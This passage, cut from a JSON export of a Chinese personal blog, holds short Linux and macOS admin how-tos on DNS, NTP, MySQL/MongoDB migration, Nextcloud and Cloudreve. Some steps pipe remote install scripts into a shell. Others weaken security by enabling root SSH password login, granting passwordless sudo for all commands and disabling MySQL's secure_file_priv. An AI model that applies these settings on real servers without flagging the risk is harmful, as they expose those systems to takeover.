DNS","slug":"use-overture-dns","date":"2019-10-08T14:14:08.000Z","updated":"2020-12-27T16:04:52.946Z","comments":true,"path":"2019/10/08/use-overture-dns/","link":"","permalink":"https://blog.110.sh/2019/10/08/use-overture-dns/","excerpt":"","text":"使用 overture DNS 下载 overture 并解压 从 https://github.com/shawn1m/overture/releases/ 下载并解压 编辑配置文件 config.json ，如果使用下面的配置记得删掉所有注释 下载 gfwlist 和 china_ip_list 12wget https://cokebar.github.io/gfwlist2dnsmasq/gfwlist_domain.txt -O gfwlist_domain.txtwget https://raw.githubusercontent.com/17mon/china_ip_list/master/china_ip_list.txt -O china_ip_list.txt 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111&#123;\"BindAddress\": \":53\", // 绑定的端口\"DebugHTTPAddress\": \"127.0.0.1:5555\", // 可以通过 curl 127.0.0.1:5555/cache 查看缓存情况\"PrimaryDNS\": [ // 主DNS &#123; \"Name\": \"DNSPod\", \"Address\": \"119.29.29.29:53\", \"Protocol\": \"udp\", \"SOCKS5Address\": \"\", \"Timeout\": 2, \"EDNSClientSubnet\": &#123; \"Policy\": \"disable\", \"ExternalIP\": \"\", \"NoCookie\": true &#125; &#125;, &#123; \"Name\": \"AliDNS\", \"Address\": \"223.5.5.5:53\", \"Protocol\": \"udp\", \"SOCKS5Address\": \"\", \"Timeout\": 2, \"EDNSClientSubnet\": &#123; \"Policy\": \"disable\", \"ExternalIP\": \"\", \"NoCookie\": true &#125; &#125;],\"AlternativeDNS\": [ // 副 DNS &#123; \"Name\": \"OpenDNS\", \"Address\": \"208.67.222.222:443\", \"Protocol\": \"tcp\", \"SOCKS5Address\": \"\", \"Timeout\": 4, \"EDNSClientSubnet\": &#123; \"Policy\": \"disable\", \"ExternalIP\": \"\", \"NoCookie\": true &#125; &#125;, &#123; \"Name\": \"CloudFlareDNS\", \"Address\": \"one.one.one.one:853@1.1.1.1\", \"Protocol\": \"tcp-tls\", \"SOCKS5Address\": \"\", \"Timeout\": 4, \"EDNSClientSubnet\": &#123; \"Policy\": \"disable\", \"ExternalIP\": \"\", \"NoCookie\": true &#125; &#125;, &#123; \"Name\": \"GeekDNS\", \"Address\": \"ndns.233py.com:853\", \"Protocol\": \"tcp-tls\", \"SOCKS5Address\": \"\", \"Timeout\": 2, \"EDNSClientSubnet\": &#123; \"Policy\": \"disable\", \"ExternalIP\": \"\", \"NoCookie\": true &#125; &#125;, &#123; \"Name\": \"RubyFish\", \"Address\": \"dns.rubyfish.cn:853\", \"Protocol\": \"tcp-tls\", \"SOCKS5Address\": \"\", \"Timeout\": 2, \"EDNSClientSubnet\": &#123; \"Policy\": \"disable\", \"ExternalIP\": \"\", \"NoCookie\": true &#125; &#125;, &#123; \"Name\": \"BlahDNS\", \"Address\": \"dot-jp.blahdns.com:853\", \"Protocol\": \"tcp-tls\", \"SOCKS5Address\": \"\", \"Timeout\": 2, \"EDNSClientSubnet\": &#123; \"Policy\": \"disable\", \"ExternalIP\": \"\", \"NoCookie\": true &#125; &#125;],\"OnlyPrimaryDNS\": false, // 是否仅使用 主DNS\"IPv6UseAlternativeDNS\": false, // IPv6 使用副 DNS\"WhenPrimaryDNSAnswerNoneUse\": \"PrimaryDNS\",\"IPNetworkFile\": &#123; \"Primary\": \"./china_ip_list.txt\", \"Alternative\": \"\"&#125;,\"DomainFile\": &#123; \"Primary\": \"\", // 强制使用主dns解析的域名列表 \"Alternative\": \"./gfwlist_domain.txt\", // 强制使用副dns解析的列表 \"Matcher\": \"regex-list\" // 使用 正则匹配&#125;,\"HostsFile\": \"./hosts\", // 自定义 hosts 绑定\"MinimumTTL\": 1200, // 最小缓存存留时间，0 关闭\"DomainTTLFile\": \"./domain_ttl_sample\", // 域名缓存时间列表\"CacheSize\": 1024, // 缓存大小，0关闭，建议开启\"RejectQType\": [ 255]&#125; 加执行权限 1chmod +x /etc/overture-dns/overture-linux-amd64 执行 1./overture-linux-amd64","categories":[{"name":"linux","slug":"linux","permalink":"https://blog.110.sh/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://blog.110.sh/tags/linux/"},{"name":"dns","slug":"dns","permalink":"https://blog.110.sh/tags/dns/"}]},{"title":"从 nextcloud URI 中移除 index.php","slug":"remove-index.php-from-nextcloud-uri","date":"2019-09-12T01:29:06.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/09/12/remove-index.php-from-nextcloud-uri/","link":"","permalink":"https://blog.110.sh/2019/09/12/remove-index.php-from-nextcloud-uri/","excerpt":"","text":"从 nextcloud URI 中移除 index.php 仅限 Apache 编辑 nextcloud 配置文件，增加&#39;htaccess.RewriteBase&#39; =&gt; &#39;/&#39;, 1nano /var/www/nextcloud/config/config.php 使用 occ 命令更新.htaccess文件 12occ maintenance:update:htaccess# .htaccess has been updated 完成，刷新网页看效果","categories":[{"name":"Nextcloud","slug":"Nextcloud","permalink":"https://blog.110.sh/categories/Nextcloud/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"},{"name":"Nextcloud","slug":"Nextcloud","permalink":"https://blog.110.sh/tags/Nextcloud/"}]},{"title":"apt 禁止使用IPv6","slug":"disable-ipv6-on-apt","date":"2019-09-02T23:15:19.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/09/03/disable-ipv6-on-apt/","link":"","permalink":"https://blog.110.sh/2019/09/03/disable-ipv6-on-apt/","excerpt":"","text":"apt 禁止使用IPv6虽然IP v6很好，也开始普及了，但是也仅仅是能够获得IP v6地址和访问部分IP v6网站，路由基本一塌糊涂，apt 更新时经常会在IP v6上卡住，而又不想彻底抛弃IP v6，所以需要禁止 apt 使用IP v6。 1echo 'Acquire::ForceIPv4 \"true\";' | tee /etc/apt/apt.conf.d/99force-ipv4","categories":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/categories/Ubuntu/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/tags/Ubuntu/"},{"name":"apt","slug":"apt","permalink":"https://blog.110.sh/tags/apt/"}]},{"title":"tar 解压遇到的小问题","slug":"some-tar-problem","date":"2019-09-02T23:15:19.000Z","updated":"2020-12-27T16:04:52.946Z","comments":true,"path":"2019/09/03/some-tar-problem/","link":"","permalink":"https://blog.110.sh/2019/09/03/some-tar-problem/","excerpt":"","text":"tar 解压遇到的小问题解决 报错tar: Ignoring unknown extended header keyword时需要安装bsdtar例如Ubuntuapt install bsdtar，使用bsdtar即可轻松解决问题，参数不需要变，如tar xvf xxx.tar.gz变为bsdtar xvf xxx.tar.gz。 报错Pathname can&#39;t be converted from UTF-8 to current locale.时只需要增加--warning=no-unknown-keyword参数即可，如tar xvf xxx.tar.gz变为tar xvf xxx.tar.gz --warning=no-unknown-keyword。解压出来的东西是没问题的，就是可能文件名显示有问题，不过这就是另一回事了。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"tar, Linux","slug":"tar-Linux","permalink":"https://blog.110.sh/tags/tar-Linux/"}]},{"title":"Ubuntu Server 迁移 Mongodb 数据到 XFS 文件系统","slug":"Ubuntu-server-move-mongodb-data-to-xfs-filesystem","date":"2019-08-01T01:10:32.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/08/01/Ubuntu-server-move-mongodb-data-to-xfs-filesystem/","link":"","permalink":"https://blog.110.sh/2019/08/01/Ubuntu-server-move-mongodb-data-to-xfs-filesystem/","excerpt":"","text":"Ubuntu Server 迁移 Mongodb 数据到 XFS 文件系统XFS 很强，具体有多强需要自己去查资料了，总之Mongodb使用是有好处的。 添加硬盘并格式化 首先添加一块硬盘，我这里的硬盘为/dev/sdb，并且格式化为 XFS，命令为 mkfs.xfs /dev/sdb。 然后查看是否格式化成功df -Th，这里没有挂载的地址。 接下来准备修改fstab 文件，使用blkid /dev/sdb获取UUID（UUID比设备名稳定）。 然后创建一个文件夹用于挂载硬盘，我这里使用的/data。 然后在/etc/fstab添加一行UUID=你的UUID /data xfs defaults,noatime,nobarrier 0 0。 最后执行mount -a如无报错则使用df -Th就能看到已经成功挂载了。 修改配置 执行service mongodb stop停止服务。 创建文件夹mkdir /data/db。 编辑/etc/mongodb.conf里的dbpath，修改为dbpath=/data/db。 迁移数据 执行/var/lib/mongodb/* /data/db移动数据。 然后执行chown mongodb:mongodb -R /data/db恢复权限。 启动 执行service mongodb start恢复服务。 执行service mongodb status查看服务运行状态，显示active (running)则启动成功。 执行mongo查看是否还有XFS的提醒，如果没有则一切OK。","categories":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/categories/Ubuntu/"}],"tags":[{"name":"Mongodb","slug":"Mongodb","permalink":"https://blog.110.sh/tags/Mongodb/"},{"name":"XFS","slug":"XFS","permalink":"https://blog.110.sh/tags/XFS/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/tags/Ubuntu/"}]},{"title":"如何转移 MySQL 的数据到 MongoDB","slug":"how-to-move-mysql-data-to-mongodb","date":"2019-07-28T11:44:55.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/07/28/how-to-move-mysql-data-to-mongodb/","link":"","permalink":"https://blog.110.sh/2019/07/28/how-to-move-mysql-data-to-mongodb/","excerpt":"","text":"如何转移 MySQL 的数据到 MongoDB我的系统是 Ubuntu 安装 ruby 1apt install ruby 安装 mongoify 1gem install mongoify 配置数据库 新建一个database.config 填写数据库配置 123456789101112sql_connection do adapter &quot;mysql2&quot; host &quot;localhost&quot; username &quot;root&quot; password &quot;passw0rd&quot; database &quot;my_database&quot;endmongodb_connection do host &quot;localhost&quot; database &quot;my_database&quot;end 检查数据库配置 12345mongify check database.config# 如果提示 Specified 'mysql' for database adapter, but the gem is not loaded. Add `gem 'mysql'` to your Gemfile 则需要安装 mysql# gem install mysql2# 如果安装 mysql2 提示：mkmf.rb can't find header files for ruby at /usr/lib/ruby/include/ruby.h 则需要安装 libmysqlclient-devapt install libmysqlclient-dev 提示这个即可下一步 12SQL connection worksNoSQL connection works 配置转移配置 先自动生成一个 1mongify translation database.config &gt; translation.rb 随后开始根据文档修改，或者如果没有需要动的结构直接迁移即可，这是文档地址)。 开始转移 1mongify process database.config translation.rb 附录 转移过程中 清理/修改 数据 12345678910111213141516table \"sgk\" do # 修改列名 column \"name1\", :string, :rename_to =&gt; 'username' # 保持原样，未作修改 column \"email\", :string # 忽略这个列 column \"id\", :key, :ignore =&gt; true # 保存之前操作 before_save do |row| # 清理空格 if row.username row.username = row.username.strip end endend","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.110.sh/tags/MySQL/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://blog.110.sh/tags/MongoDB/"},{"name":"Ruby","slug":"Ruby","permalink":"https://blog.110.sh/tags/Ruby/"}]},{"title":"解决 Ubuntu MySQL 导出文件无法写入","slug":"fix-mysql-outfile-rw-error","date":"2019-07-28T04:31:31.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/07/28/fix-mysql-outfile-rw-error/","link":"","permalink":"https://blog.110.sh/2019/07/28/fix-mysql-outfile-rw-error/","excerpt":"","text":"解决 Ubuntu MySQL 导出文件无法写入错误提示ERROR 1 (HY000): Can&#39;t create/write to file &#39;&#39; (Errcode: 13 - Permission denied) 1234567891011121314151617# 查看是否有限制aa-status | grep mysqld# 如果有输出则表示有限制# -----------------------------------# 编辑配置，给指定的目录增加权限nano /etc/apparmor.d/usr.sbin.mysqld# 添加以下内容到/usr/sbin/mysqld &#123;&#125;/to/path/ r,/to/path/** rwk,# 保存# -----------------------------------# 重新加载/etc/init.d/apparmor reload # 完毕","categories":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/categories/Ubuntu/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/tags/Ubuntu/"},{"name":"MySQL","slug":"MySQL","permalink":"https://blog.110.sh/tags/MySQL/"}]},{"title":"Ubuntu 关闭 secure_file_priv","slug":"ubuntu-disable-secure_file_priv","date":"2019-07-28T02:31:31.000Z","updated":"2020-12-27T16:04:52.946Z","comments":true,"path":"2019/07/28/ubuntu-disable-secure_file_priv/","link":"","permalink":"https://blog.110.sh/2019/07/28/ubuntu-disable-secure_file_priv/","excerpt":"","text":"Ubuntu 关闭 secure_file_priv 编辑配置文件 1nano /etc/mysql/mysql.conf.d/mysqld.cnf 添加内容到文件底部 1secure_file_priv=&quot;&quot; 重启 mysql 1service mysql restart","categories":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/categories/Ubuntu/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/tags/Ubuntu/"},{"name":"MySQL","slug":"MySQL","permalink":"https://blog.110.sh/tags/MySQL/"}]},{"title":"Ubuntu 更改 man 为中文文档","slug":"ubuntu-change-man-page-to-chinese","date":"2019-07-06T07:44:15.000Z","updated":"2020-12-27T16:04:52.946Z","comments":true,"path":"2019/07/06/ubuntu-change-man-page-to-chinese/","link":"","permalink":"https://blog.110.sh/2019/07/06/ubuntu-change-man-page-to-chinese/","excerpt":"","text":"Ubuntu 更改 man 为中文文档执行下面命令即可 12apt install man manpages-zhsed -i 's/\\/usr\\/share\\/man/\\/usr\\/share\\/man\\/zh_CN/g' /etc/manpath.config","categories":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/categories/Ubuntu/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/tags/Ubuntu/"}]},{"title":"如何在 Ubuntu 18.04 中修改 DNS","slug":"how-to-change-dns-on-ubuntu-18-04","date":"2019-06-08T15:54:10.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/06/08/how-to-change-dns-on-ubuntu-18-04/","link":"","permalink":"https://blog.110.sh/2019/06/08/how-to-change-dns-on-ubuntu-18-04/","excerpt":"","text":"如何在 Ubuntu 18.04 中修改 DNS 先安装 resolvconf 1sudo apt install resolvconf 然后编辑配置文件 编辑/etc/resolvconf/resolv.conf.d/head修改nameserver配置项，内容类似： 12nameserver 8.8.4.4nameserver 8.8.8.8 重启 reslovconf 1sudo service resolvconf restart","categories":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/categories/Ubuntu/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/tags/Ubuntu/"},{"name":"linux","slug":"linux","permalink":"https://blog.110.sh/tags/linux/"}]},{"title":"如何在 Ubuntu 18.04 中开启 root 登陆","slug":"how-to-enable-root-login-on-ubuntu-18-04","date":"2019-06-08T11:44:55.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/06/08/how-to-enable-root-login-on-ubuntu-18-04/","link":"","permalink":"https://blog.110.sh/2019/06/08/how-to-enable-root-login-on-ubuntu-18-04/","excerpt":"","text":"如何在 Ubuntu 18.04 中开启 root 登陆 设置 root 密码 1sudo passwd 修改 SSH 设置 1sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config 重启 SSH 服务 1sudo service ssh restart","categories":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/categories/Ubuntu/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"}]},{"title":"解锁网易云音乐","slug":"unlock-netease-music","date":"2019-05-20T16:43:28.000Z","updated":"2020-12-27T16:04:52.946Z","comments":true,"path":"2019/05/21/unlock-netease-music/","link":"","permalink":"https://blog.110.sh/2019/05/21/unlock-netease-music/","excerpt":"","text":"解锁网易云音乐网易云、QQ音乐等内容全都有版权问题，即使有VIP也不能全听，换APP很烦 搭建我的环境比较特殊，不一定大家能参考，仅做记录。 我在路由器上把 music.163.com和interface.music.163.com都解析到了我的内网已经搭建了这个服务的主机上，这样整个内网的机器就不需要设置代理了，不然那么多设备设置的要累死了。 安装 nodejs、git、supervisor 12curl -sL https://deb.nodesource.com/setup_10.x | bash -apt install -y nodejs git supervisor 克隆代码 123git clone https://github.com/nondanee/UnblockNeteaseMusic.git# 记录路径pwd 配置 supervisor，替换下面的 /home/pi 为刚才的路径 123456789[program:unblock]command=/usr/bin/node /home/pi/UnblockNeteaseMusic/app.js -p 80stdout_logfile=/tmp/UnblockNeteaseMusic.logautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true 启动 1234sudo supervisorctl reload# 查看是否运行sudo supervisorctl status# unblock RUNNING pid 774, uptime 0:10:36 配置路由器DNS，这个支持的路由器配置起来很简单，如果不支持的路由器也没办法配置 整个网络的网易云都可以听了","categories":[{"name":"Docker","slug":"Docker","permalink":"https://blog.110.sh/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://blog.110.sh/tags/Docker/"},{"name":"Caddy","slug":"Caddy","permalink":"https://blog.110.sh/tags/Caddy/"}]},{"title":"LEDE 修复 IPv6 \"no route to host\" 问题","slug":"fix-no-route-to-host-ipv6-on-lede","date":"2019-05-07T14:19:16.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/05/07/fix-no-route-to-host-ipv6-on-lede/","link":"","permalink":"https://blog.110.sh/2019/05/07/fix-no-route-to-host-ipv6-on-lede/","excerpt":"","text":"LEDE 修复 IPv6 “no route to host” 问题实机装了 LEDE 软路由，但是偶然发现局域网内 IPv6 只能 ping 通网关，而其他设备不通。 修复办法： 打开 网络–接口 http://lede.lan/cgi-bin/luci/admin/network/network 编辑 LAN 口（网关口） 勾选在页面下方的 DHCP–总是通告默认路由 重启软路由或者使设备重新获取 IP 地址","categories":[{"name":"router","slug":"router","permalink":"https://blog.110.sh/categories/router/"}],"tags":[{"name":"LEDE","slug":"LEDE","permalink":"https://blog.110.sh/tags/LEDE/"},{"name":"router","slug":"router","permalink":"https://blog.110.sh/tags/router/"}]},{"title":"Ubuntu 安装 ntp 客户端 ntpdate 和 ntp 服务器","slug":"ubuntu-install-ntp-server-and-ntp-client","date":"2019-05-04T14:20:34.000Z","updated":"2020-12-27T16:04:52.946Z","comments":true,"path":"2019/05/04/ubuntu-install-ntp-server-and-ntp-client/","link":"","permalink":"https://blog.110.sh/2019/05/04/ubuntu-install-ntp-server-and-ntp-client/","excerpt":"Ubuntu 安装 ntp 客户端 ntpdate 和 ntp 服务器搭建 ntp 服务器方便局域网使用，省的每次对时都耗时多几秒。","text":"Ubuntu 安装 ntp 客户端 ntpdate 和 ntp 服务器搭建 ntp 服务器方便局域网使用，省的每次对时都耗时多几秒。 安装 ntpdate 客户端要要想做 ntp 服务器首先要保证自己的时间正确。 1234# 安装 ntp 客户端sudo apt install ntpdate# 对时并写入主板sudo ntpdate -vu ntp.ntsc.ac.cn &amp;&amp; sudo hwclock -w 个人推荐的国内 ntp 服务器列表尽可能选择延迟最低的服务器作为首选服务器。 国家授时中心ntp.ntsc.ac.cn 中国授时cn.ntp.org.cn 安装/配置/启动 ntp 服务器安装1sudo apt install ntp 配置编辑/etc/ntp.conf可以修改 ntp 服务器配置，以下是我的配置。 123456789101112131415# 权限restrict default kod nomodify notrap nopeer noquery &lt;==拒绝 IPv4 的用户restrict -6 default kod nomodify notrap nopeer noquery &lt;==拒绝 IPv6 的用户restrict 127.0.0.1 &lt;==底下两个是默认值，放行本机来源restrict -6 ::1restrict 10.0.0.0 mask 255.0.0.0 nomodify &lt;==放行局域网restrict 192.168.0.0 mask 255.255.0.0 nomodify &lt;==放行局域网# 上层时间服务器server ntp.ntsc.ac.cn prefer &lt;==优先,国家授时中心server cn.ntp.org.cn &lt;==中国授时# 预设时间差异分析档案与暂不用到的 keys 等，不需要更动它：driftfile /var/lib/ntp/driftkeys /etc/ntp/keys 启动保存配置文件后执行操作 1234# 编辑后启动服务sudo service ntp start# 查看服务状态，一般都会绑定 123 端口sudo service ntp status 需要注意的是，如果时间差过大，将无法从上层服务器获取正确的时间 只监听 IPv4/6编辑/etc/default/ntp修改NTPD_OPTS=&#39;-g&#39;为NTPD_OPTS=&#39;-g -4&#39;是只监听 IPv4，同理修改为NTPD_OPTS=&#39;-g -6&#39;为只监听 IPv6。 not in sync, skipping this server如果刚搭建好的服务器从别的机器尝试同步时间出现这个错误不必担心，因为服务器时间尚未同步，可以静等一段时间再试，或者在 ntp 服务器上执行sudo ntpdate -vu ntp.ntsc.ac.cn，与上层服务器手动同步一次。 参考资料 鸟哥的 Linux 私房菜 – NTP 时间服务器 https://unix.stackexchange.com/questions/415653/ntpd-configured-for-ipv6-not-binding-ipv6-port","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"system time","slug":"system-time","permalink":"https://blog.110.sh/tags/system-time/"},{"name":"ubuntu","slug":"ubuntu","permalink":"https://blog.110.sh/tags/ubuntu/"},{"name":"ntp","slug":"ntp","permalink":"https://blog.110.sh/tags/ntp/"}]},{"title":"修复黑苹果时间错误","slug":"fix-hackintosh-wrong-time","date":"2019-05-04T13:55:54.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/05/04/fix-hackintosh-wrong-time/","link":"","permalink":"https://blog.110.sh/2019/05/04/fix-hackintosh-wrong-time/","excerpt":"","text":"修复黑苹果时间错误最近在玩黑苹果，但是因为我的 CPU 是动态睿频的，导致 CPU 时间总会出错，每秒钟都会快击败毫秒，并且在使用 safari 浏览器播放视频时声画不同步。在 Clover 中的 CPU 里修改了频率也无效，去掉 NTP 服务器后面的点.也没用，所以想了歪点子，就是加快与 NTP 服务器同步的频率，默认是3600秒，修改为60秒，这样有时间差也不会太夸张，但这个办法不能修复声画不同步。 命令方式 系统版本 &gt;= High Sierra 100%有效， 缺点是不知道为什么每次同步时间，窗口都会失去焦点。 之前的每次都会失去焦点是因为Dynamic dark mode应用导致的，非常完美。 12# 这条命令是每分钟与时间服务器同步一次while true; do sudo sntp -sS time.asia.apple.com; sleep 60; done 如果报错 kod_init_kod_db(): Cannot open KoD db file /var/db/ntp-kod: No such file or directory 执行下面的命令即可 12sudo touch /var/db/ntp-kodsudo chmod 666 /var/db/ntp-kod 或者使用crontab 123crontab -e# 每分钟同步一次时间* * * * * sntp -sS time.asia.apple.com &gt;&gt; /tmp/time_sync.log 修改 plist打开/System/Library/LaunchDaemons/com.apple.timed.plist，找到StartInterval项，修改3600为60，重启即可。 附修改好的 plist 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;&lt;plist version=\"1.0\"&gt;&lt;dict&gt; &lt;key&gt;GroupName&lt;/key&gt; &lt;string&gt;_timed&lt;/string&gt; &lt;key&gt;JetsamProperties&lt;/key&gt; &lt;dict&gt; &lt;key&gt;JetsamMemoryLimit&lt;/key&gt; &lt;integer&gt;2500&lt;/integer&gt; &lt;key&gt;JetsamPriority&lt;/key&gt; &lt;integer&gt;-49&lt;/integer&gt; &lt;/dict&gt; &lt;key&gt;KeepAlive&lt;/key&gt; &lt;true/&gt; &lt;key&gt;Label&lt;/key&gt; &lt;string&gt;com.apple.timed&lt;/string&gt; &lt;key&gt;LaunchEvents&lt;/key&gt; &lt;dict&gt; &lt;key&gt;com.apple.systemconfiguration&lt;/key&gt; &lt;dict&gt; &lt;key&gt;airplane mode changed&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Identifier&lt;/key&gt; &lt;string&gt;com.apple.radios.plist&lt;/string&gt; &lt;key&gt;KeyPath&lt;/key&gt; &lt;string&gt;AirplaneMode&lt;/string&gt; &lt;key&gt;Value&lt;/key&gt; &lt;false/&gt; &lt;/dict&gt; &lt;/dict&gt; &lt;/dict&gt; &lt;key&gt;MachServices&lt;/key&gt; &lt;dict&gt; &lt;key&gt;com.apple.timed.xpc&lt;/key&gt; &lt;true/&gt; &lt;/dict&gt; &lt;key&gt;POSIXSpawnType&lt;/key&gt; &lt;string&gt;Interactive&lt;/string&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/usr/libexec/timed&lt;/string&gt; &lt;/array&gt; &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt; &lt;key&gt;StartInterval&lt;/key&gt; &lt;integer&gt;60&lt;/integer&gt; &lt;key&gt;ThrottleInterval&lt;/key&gt; &lt;integer&gt;3&lt;/integer&gt; &lt;key&gt;UserName&lt;/key&gt; &lt;string&gt;_timed&lt;/string&gt;&lt;/dict&gt;&lt;/plist&gt; 参考资料 stackexchange","categories":[{"name":"hackintosh","slug":"hackintosh","permalink":"https://blog.110.sh/categories/hackintosh/"}],"tags":[{"name":"hackintosh","slug":"hackintosh","permalink":"https://blog.110.sh/tags/hackintosh/"},{"name":"system time","slug":"system-time","permalink":"https://blog.110.sh/tags/system-time/"}]},{"title":"hackintosh-mojave-fix-jpeg-preview","slug":"hackintosh-mojave-fix-jpeg-preview","date":"2019-05-01T14:14:08.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/05/01/hackintosh-mojave-fix-jpeg-preview/","link":"","permalink":"https://blog.110.sh/2019/05/01/hackintosh-mojave-fix-jpeg-preview/","excerpt":"","text":"黑苹果 Mojave 修复 JPG/JPEG 预览问题 方法一：修改 SMBIOSes 为 MacPro5,1 / MacPro6,1 即可预览 方法二：安装 NoVPAJpeg KEXT，github 地址 ，下载与自己 Lilu 对应的版本安装上即可","categories":[{"name":"hackintosh","slug":"hackintosh","permalink":"https://blog.110.sh/categories/hackintosh/"}],"tags":[{"name":"hackintosh","slug":"hackintosh","permalink":"https://blog.110.sh/tags/hackintosh/"},{"name":"mojave","slug":"mojave","permalink":"https://blog.110.sh/tags/mojave/"}]},{"title":"通过 brew cask 安装 Mac 应用","slug":"mac-app-from-brew-cask","date":"2019-04-28T14:23:30.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/04/28/mac-app-from-brew-cask/","link":"","permalink":"https://blog.110.sh/2019/04/28/mac-app-from-brew-cask/","excerpt":"","text":"通过 brew cask 安装 Mac 应用12345brew cask install dynamic-dark-mode typora mounty ezip balenaetcher visual-studio-code iina mos brooklyn clipy proxyman switchhosts fork google-chrome qlmarkdown v2rayu# 几乎所有的特殊字体都有了brew tap caskroom/fontsbrew cask install font-hack-nerd-font 列表 dynamic-dark-mode 根据时间自动切换到夜间模式 typora 实时 markdown 编辑器，对大纲支持的更好，比 mark-text 更出色 mounty 挂载 NTFS 的工具 ezip 压缩解压缩的神器 balenaetcher 烧录镜像到 U 盘的神器 visual-studio-code 强大的代码编辑器 VSCode iina 视频播放器，支持多格式 Mos 第三方鼠标滚动顺滑方案，免费且远超收费的 smoothscroll clipy 剪切板增强，历史记录等 brooklyn 苹果风格的屏保 proxyman HTTP/HTTPS 抓包工具，免费，漂亮，好用 switchhosts hosts 文件快速切换编辑 fork git 客户端，漂亮，高性能 google-chrome 谷歌浏览器 qlmarkdown Markdown 快捷预览工具 v2rayu V2ray Mac 客户端，支持订阅","categories":[{"name":"Mac","slug":"Mac","permalink":"https://blog.110.sh/categories/Mac/"}],"tags":[{"name":"Mac","slug":"Mac","permalink":"https://blog.110.sh/tags/Mac/"},{"name":"brew","slug":"brew","permalink":"https://blog.110.sh/tags/brew/"},{"name":"app","slug":"app","permalink":"https://blog.110.sh/tags/app/"}]},{"title":"设置 sudo 命令不需要密码","slug":"setup-sudo-command-without-require-password","date":"2019-04-24T16:24:50.000Z","updated":"2020-12-27T16:04:52.946Z","comments":true,"path":"2019/04/25/setup-sudo-command-without-require-password/","link":"","permalink":"https://blog.110.sh/2019/04/25/setup-sudo-command-without-require-password/","excerpt":"","text":"设置 sudo 命令不需要密码123456# 编辑 sudo 命令权限文件sudo visudo# 在最后一行增加# 要免密码的用户名 ALL=(ALL) NOPASSWD: ALL# 例如zhangsan ALL=(ALL) NOPASSWD: ALL","categories":[{"name":"linux","slug":"linux","permalink":"https://blog.110.sh/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://blog.110.sh/tags/linux/"}]},{"title":"安装 Cloudreve","slug":"install-cloudreve","date":"2019-04-16T07:51:58.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/04/16/install-cloudreve/","link":"","permalink":"https://blog.110.sh/2019/04/16/install-cloudreve/","excerpt":"","text":"安装 Cloudreve ubuntu 18.04 docker 那个版本总是有问题就算了 (2019/04/16) 之所以要安装是因为长得好看 安装12# 安装必备内容apt install mysql-server apache2 php php-curl php-gd php-dom php-mbstring php-zip php-mysql php-mysqli -y mysql 创建数据库 1CREATE DATABASE cloudreve CHARACTER SET utf8 COLLATE utf8_general_ci; 安装 composer 12curl -sS https://getcomposer.org/installer | phpsudo mv composer.phar /usr/local/bin/composer 安装 cloudreve 12cd 你要安装的目录composer create-project hfo4/cloudreve:dev-master 交互环节 12345678Do you want to remove the existing VCS (.git, .svn..) history? [Y,n]? # YInput the hostname of your MySQL server (Default:127.0.0.1): //数据库连接地址，本的话默认回车The database name:pan //数据库名称The username of your MySQL server (Default:root):root //数据库用户名The password of your MySQL server:mf8.biz //数据库用户密码The hostport of your MySQL server (Default:3306): //数据库端口，默认回车The full-url to access to your Cloudreve (e.g. 